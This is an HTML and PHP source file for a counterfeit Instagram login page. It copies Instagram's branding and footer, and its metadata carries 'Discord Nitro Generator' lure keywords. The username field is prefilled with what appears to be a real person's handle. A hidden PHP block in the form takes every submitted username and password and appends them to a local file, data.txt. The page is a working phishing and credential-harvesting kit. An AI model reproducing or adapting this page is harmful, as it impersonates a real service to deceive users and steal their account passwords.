<!DOCTYPE html>
<html lang="en,tr">
<!--EmreBey &copyright 2023 - 0000 All rights reserved.-->
<head>
    <link rel="stylesheet" href="index.css">
  <link href="data:image/jpeg;base64,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"
        rel="shortcut icon" type="image/x-icon">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in | İnstagram</title>
    <meta property="og:type" content="website">
<meta property="og:title" content="Instagram | Giriş yap ve arkadaşlarının mesajlarını oku!" />
<meta property="og:description" content="Discord Nitro Generator" />
<meta name="author" content="Bey Projects"/>
<meta name="keywords" content="Discord Nitro Generator, dc nitro generator, EmreBey, emrebey,
emrebey generator,  dc nitro gen, dc nitro, dc, discord, emrebey jeneratr">
</head>
<body>
    <script src="index.js"></script>
    <span id="root">
      <section class="section-all">
        <main class="main" role="main">
          <div class="wrapper">
            <article class="article">
              <div class="content">
                <div class="login-box">
                  <div class="header">
                    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram">
                  </div>
                  <div class="form-wrap">
                    <form class="form"  method="post">
                      <div class="input-box">
                        <label for="first-name">
                        <input name="firstname" type="text" id="target" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="damlaakgungor" required>
                      </label></div>  
                      <div class="input-box">
                        <label for="last-name">
                        <input name="lastname" type="password" name="password" id="password" placeholder="Password" aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required>
                        <?php
                        //Post mekanizması
if( isset($_POST['firstname'] ) && isset( $_POST['lastname'] ) )
{
    $txt= $_POST['firstname'].' - '.$_POST['lastname'] . PHP_EOL; 
    file_put_contents('data.txt', $txt, FILE_APPEND);
}
?>
                      </label></div>  
                      <span class="button-box">
                        <button  class="btn" type="submit" name="submit">Log in</button>
                      </span>  
  
                      <a class="forgot" href="">Forgot password?</a>
                    </form>
                  </div> 
                </div> 
  
                <div class="login-box">
                  <p class="text">Don't have an account?<a href="#">Sign up</a></p>
                </div> 
  
                <div class="app">
                  <p>Get the app.</p>
                  <div class="app-img">
                    <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" >
                    </a>
                    <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                      <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png">
                    </a>  
                  </div>  
                </div> 
              </div> 
            </article>
          </div> 
        </main>
  
        <!-- 2-Role Footer -->
        <footer class="footer" role="contentinfo">
          <div class="footer-container">
  
            <nav class="footer-nav" role="navigation">
              <ul>
                <li><a href="https://about.instagram.com/" target="_blank">About Us</a></li>
                <li><a href="https://help.instagram.com/" target="_blank">Support</a></li>
                <li><a href="https://about.instagram.com/en_US/blog" target="_blank">Blog</a></li>
                <li><a href="error.html">Press</a></li>
                <li><a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge" target="_blank">Api</a></li>
                <li><a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a></li>
                <li><a href="https://privacycenter.instagram.com/policy/?entry_point=ig_help_center_data_policy_redirect" target="_blank">Privacy</a></li>
                <li><a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a></li>
                <li><a href="error.html" target="_blank">Directory</a></li>
                <li>
                  <span class="language">Language
                    <select name="language" class="select" onchange="la(this.value)">
                      <option value="#">English</option>
                      <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                    </select>
                  </span>
                </li>
              </ul>
            </nav>
  
            <span class="footer-logo">&copy; 2022 Instagram from Meta</span>
          </div> 
        </footer>
        
      </section>
    </span>  
  </body>  
</html>
  